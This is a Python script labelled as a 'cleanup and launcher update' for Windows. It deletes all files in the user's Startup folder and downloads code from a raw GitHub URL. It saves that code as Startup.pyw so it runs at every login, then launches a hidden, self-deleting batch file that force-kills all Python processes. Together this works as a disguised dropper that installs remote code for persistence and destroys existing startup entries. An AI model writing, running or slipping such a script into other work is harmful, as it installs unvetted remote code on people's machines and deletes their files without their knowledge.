# monitor_script.py - Simple: delete, create, end
import os
import sys
import subprocess
import tempfile
import time
import urllib.request

def main():
    print("Executing cleanup and launcher update...")
    
    # Get paths
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # STEP 1: DELETE ALL FILES (except this script)
    print("\n[1/3] Deleting all files...")
    
    # Delete from startup folder
    for file in os.listdir(startup_folder):
        if file != "Startup.pyw":  # Keep if exists, will be replaced
            try:
                os.remove(os.path.join(startup_folder, file))
                print(f"  Deleted from startup: {file}")
            except:
                pass
    
    # STEP 2: CREATE THE LAUNCHER
    print("\n[2/3] Creating launcher...")
    
    # Download github_launcher.pyw from GitHub
    try:
        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        response = urllib.request.urlopen(url, timeout=10)
        launcher_code = response.read().decode('utf-8')
        print(f"✓ Downloaded: {url}")
    except Exception as e:
        print(f"✗ Download failed: {e}")
        sys.exit(1)
    
    # Save as Startup.pyw
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    try:
        with open(startup_file, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        print(f"✓ Saved as: {startup_file}")
    except Exception as e:
        print(f"✗ Save failed: {e}")
        sys.exit(1)
    
    # STEP 3: END ALL PROCESSES
    print("\n[3/3] Ending all Python processes...")
    
    # Create batch file to kill all Python processes
    batch_content = '''@echo off
echo Killing all Python processes...
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im pythonw.exe >nul 2>&1
ping 127.0.0.1 -n 2 >nul
echo Done. Processes terminated.
del "%~f0" >nul 2>&1
'''
    
    batch_file = os.path.join(tempfile.gettempdir(), "kill_all.bat")
    with open(batch_file, 'w') as f:
        f.write(batch_content)
    
    # Run batch file (will kill this script too)
    subprocess.Popen(['cmd', '/c', batch_file], 
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("✓ Cleanup process started")
    print("\n" + "="*50)
    print("SCRIPT COMPLETE")
    print("1. Files deleted ✓")
    print("2. Launcher created ✓")
    print("3. Processes ending ✓")
    print("="*50)
    
    # Exit immediately
    sys.exit(0)

if __name__ == "__main__":
    main()
